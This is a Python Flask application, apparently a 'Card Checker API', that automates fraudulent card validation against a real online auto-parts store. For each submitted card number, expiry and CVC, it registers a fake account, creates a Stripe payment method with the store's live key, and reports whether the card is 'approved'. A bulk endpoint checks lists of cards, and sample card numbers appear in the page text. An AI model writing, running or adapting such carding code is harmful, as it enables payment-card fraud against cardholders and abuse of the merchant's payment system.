from flask import Flask, request, jsonify
import requests
import random
import uuid
from bs4 import BeautifulSoup
import re
import time
import os

app = Flask(__name__)

class BestAutoPartsPayment:
    def __init__(self, card_data):
        self.session = requests.Session()
        self.base_url = "https://bestautoparts.ae"
        self.stripe_key = "pk_live_51PCOdtDnOwzUaHAKvBaClfu774YJDlnfroSd9TGqNx4WbW9YlnymxTV5x0gL6RbHPVA1ifFuY0qTkeQjCHY7PM9000iHfY5Pxe"
        self.card_data = card_data
        
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'Origin': self.base_url,
            'Referer': f'{self.base_url}/my-account/'
        }

    def generate_email(self):
        domains = ["gmail.com", "yahoo.com", "hotmail.com"]
        names = ["john", "mike", "david", "robert", "ali", "omar"]
        return f"{random.choice(names)}{random.randint(1000,9999)}@{random.choice(domains)}"

    def get_ajax_nonce(self):
        resp = self.session.get(f"{self.base_url}/my-account/add-payment-method/")
        pattern = r'createAndConfirmSetupIntentNonce["\']?\s*:\s*["\']([^"\']+)["\']'
        match = re.search(pattern, resp.text)
        if match:
            return match.group(1)
        else:
            return "49d2c6a044"

    def register_account(self):
        resp = self.session.get(f"{self.base_url}/my-account/")
        soup = BeautifulSoup(resp.content, 'html.parser')
        nonce_input = soup.find('input', {'id': 'woocommerce-register-nonce'})
        if not nonce_input:
            return None
        nonce = nonce_input['value']
        email = self.generate_email()
        payload = {
            'email': email,
            'woocommerce-register-nonce': nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register'
        }
        headers = self.headers.copy()
        headers.update({
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': f'{self.base_url}/my-account/'
        })
        resp = self.session.post(f"{self.base_url}/my-account/", data=payload, headers=headers)
        if 'registration complete' in resp.text.lower() or email in resp.text:
            return email
        else:
            return None

    def create_payment_method(self):
        stripe_muid = str(uuid.uuid4())
        stripe_sid = str(uuid.uuid4())
        stripe_guid = str(uuid.uuid4())
        
        payload = {
            'type': 'card',
            'card[number]': self.card_data['number'],
            'card[cvc]': self.card_data['cvc'],
            'card[exp_month]': self.card_data['exp_month'],
            'card[exp_year]': self.card_data['exp_year'],
            'billing_details[address][country]': 'AE',
            'billing_details[address][postal_code]': '00000',
            'billing_details[name]': 'Test User',
            'pasted_fields': 'number',
            'allow_redisplay': 'unspecified',
            'payment_user_agent': 'stripe.js/e6902d454e; stripe-js-v3/e6902d454e; payment-element',
            'referrer': f'{self.base_url}',
            'time_on_page': '83921',
            'key': self.stripe_key,
            '_stripe_version': '2024-06-20',
            '_stripe_account': 'acct_1PCOdtDnOwzUaHAK',
            'guid': stripe_guid,
            'muid': stripe_muid,
            'sid': stripe_sid
        }
        
        stripe_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
            'Accept': 'application/json',
            'Accept-Language': 'en-GB,en;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site'
        }
        
        try:
            resp = self.session.post(
                "https://api.stripe.com/v1/payment_methods",
                data=payload,
                headers=stripe_headers,
                timeout=30
            )
            
            if resp.status_code == 200:
                result = resp.json()
                if 'id' in result:
                    return result['id']
                else:
                    error_message = "Unknown error"
                    if 'error' in result and 'message' in result['error']:
                        error_message = result['error']['message']
                    return f"ERROR: {error_message}"
            else:
                error_message = f"HTTP {resp.status_code} Error"
                try:
                    result = resp.json()
                    if 'error' in result and 'message' in result['error']:
                        error_message = result['error']['message']
                except:
                    pass
                return f"ERROR: {error_message}"
                
        except Exception as e:
            return f"ERROR: {str(e)}"
        
        return None

    def confirm_payment_setup(self, payment_method_id):
        ajax_nonce = self.get_ajax_nonce()
        payload = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce
        }
        headers = self.headers.copy()
        headers.update({
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': f'{self.base_url}/my-account/add-payment-method/'
        })
        try:
            resp = self.session.post(
                f"{self.base_url}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent",
                data=payload,
                headers=headers,
                timeout=30
            )
            return resp
        except Exception as e:
            return None

    def run_payment_test(self):
        total_start_time = time.time()
        
        email = self.register_account()
        if not email:
            return {
                'status': 'declined',
                'card': self.card_data['number'],
                'message': 'Registration failed',
                'time': time.time() - total_start_time,
                'full_card': f"{self.card_data['number']}|{self.card_data['exp_month']}|{self.card_data['exp_year']}|{self.card_data['cvc']}"
            }
        
        payment_method_id = self.create_payment_method()
        
        if payment_method_id.startswith("ERROR:"):
            return {
                'status': 'declined',
                'card': self.card_data['number'],
                'message': payment_method_id,
                'time': time.time() - total_start_time,
                'full_card': f"{self.card_data['number']}|{self.card_data['exp_month']}|{self.card_data['exp_year']}|{self.card_data['cvc']}"
            }
            
        ajax_response = self.confirm_payment_setup(payment_method_id)
        
        total_end_time = time.time()
        execution_time = total_end_time - total_start_time
        
        if ajax_response and ajax_response.status_code == 200:
            try:
                ajax_data = ajax_response.json()
                if ajax_data.get('success', False):
                    return {
                        'status': 'approved',
                        'card': self.card_data['number'],
                        'message': 'Card approved',
                        'response': ajax_data,
                        'time': execution_time,
                        'full_card': f"{self.card_data['number']}|{self.card_data['exp_month']}|{self.card_data['exp_year']}|{self.card_data['cvc']}"
                    }
                else:
                    return {
                        'status': 'declined',
                        'card': self.card_data['number'],
                        'message': 'Card declined',
                        'response': ajax_data,
                        'time': execution_time,
                        'full_card': f"{self.card_data['number']}|{self.card_data['exp_month']}|{self.card_data['exp_year']}|{self.card_data['cvc']}"
                    }
            except:
                if 'success' in ajax_response.text.lower():
                    return {
                        'status': 'approved',
                        'card': self.card_data['number'],
                        'message': 'Card approved',
                        'response': ajax_response.text[:200],
                        'time': execution_time,
                        'full_card': f"{self.card_data['number']}|{self.card_data['exp_month']}|{self.card_data['exp_year']}|{self.card_data['cvc']}"
                    }
                else:
                    return {
                        'status': 'declined',
                        'card': self.card_data['number'],
                        'message': 'Card declined',
                        'response': ajax_response.text[:200],
                        'time': execution_time,
                        'full_card': f"{self.card_data['number']}|{self.card_data['exp_month']}|{self.card_data['exp_year']}|{self.card_data['cvc']}"
                    }
        else:
            response_text = "No response or failed connection"
            if ajax_response:
                response_text = f"HTTP {ajax_response.status_code}"
            return {
                'status': 'declined',
                'card': self.card_data['number'],
                'message': 'Setup confirmation failed',
                'response': response_text,
                'time': execution_time,
                'full_card': f"{self.card_data['number']}|{self.card_data['exp_month']}|{self.card_data['exp_year']}|{self.card_data['cvc']}"
            }

def parse_card_input(input_text):
    """Parse card input in various formats"""
    try:
        # Support multiple formats: cc/mm/yy/cvv, cc|mm|yy|cvv, cc mm yy cvv
        if '/' in input_text:
            parts = input_text.split('/')
        elif '|' in input_text:
            parts = input_text.split('|')
        else:
            parts = input_text.split()
        
        if len(parts) < 4:
            return None
            
        card_number = parts[0].strip()
        month = parts[1].strip()
        year = parts[2].strip()
        cvc = parts[3].strip()
        
        # Format year to 4 digits
        if len(year) == 2:
            year = '20' + year
        
        # Format month to 2 digits
        if len(month) == 1:
            month = '0' + month
        
        return {
            'number': card_number,
            'exp_month': month,
            'exp_year': year,
            'cvc': cvc
        }
    except Exception as e:
        print(f"Error parsing card input: {e}")
        return None

@app.route('/')
def home():
    return """
    <html>
        <head>
            <title>Card Checker API</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; }
                .endpoint { background: #f4f4f4; padding: 20px; margin: 10px 0; border-radius: 5px; }
                code { background: #eee; padding: 2px 5px; }
            </style>
        </head>
        <body>
            <h1>🃏 Card Checker API</h1>
            <p>Single card check endpoint:</p>
            <div class="endpoint">
                <code>GET /chk?cc=card_number/exp_month/exp_year/cvv</code><br><br>
                <strong>Example:</strong><br>
                <code>/chk?cc=5132794675317471/01/27/785</code><br>
                <code>/chk?cc=5132794675317471|01|27|785</code>
            </div>
            <p><strong>Response format:</strong> JSON with status, card, message, and time</p>
        </body>
    </html>
    """

@app.route('/chk')
def check_single_card():
    """Single card check endpoint - /chk?cc=cc/mm/yy/cvv"""
    card_input = request.args.get('cc', '')
    
    if not card_input:
        return jsonify({
            'status': 'error',
            'message': 'No card provided. Use format: /chk?cc=card_number/exp_month/exp_year/cvv'
        }), 400
    
    # Parse card data
    card_data = parse_card_input(card_input)
    
    if not card_data:
        return jsonify({
            'status': 'error', 
            'message': 'Invalid card format. Use: cc/mm/yy/cvv or cc|mm|yy|cvv'
        }), 400
    
    try:
        # Run payment test
        payment_test = BestAutoPartsPayment(card_data)
        result = payment_test.run_payment_test()
        
        return jsonify(result)
        
    except Exception as e:
        return jsonify({
            'status': 'error',
            'card': card_data['number'],
            'message': f'Processing error: {str(e)}',
            'time': 0.0
        }), 500

@app.route('/bulk', methods=['GET', 'POST'])
def bulk_check():
    """Bulk card check endpoint"""
    if request.method == 'GET':
        return """
        <html>
            <head><title>Bulk Card Check</title></head>
            <body>
                <h1>Bulk Card Check</h1>
                <form method="POST">
                    <textarea name="cards" rows="10" cols="50" placeholder="Enter cards in format:
5132794675317471/01/27/785
5210664149794065/04/29/628
..."></textarea><br>
                    <input type="submit" value="Check Cards">
                </form>
            </body>
        </html>
        """
    
    cards_text = request.form.get('cards', '')
    cards_list = cards_text.strip().split('\n')
    
    results = []
    for card_line in cards_list:
        card_line = card_line.strip()
        if card_line:
            card_data = parse_card_input(card_line)
            if card_data:
                try:
                    payment_test = BestAutoPartsPayment(card_data)
                    result = payment_test.run_payment_test()
                    results.append(result)
                except Exception as e:
                    results.append({
                        'status': 'error',
                        'card': card_data['number'],
                        'message': f'Error: {str(e)}'
                    })
    
    return jsonify({'results': results})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
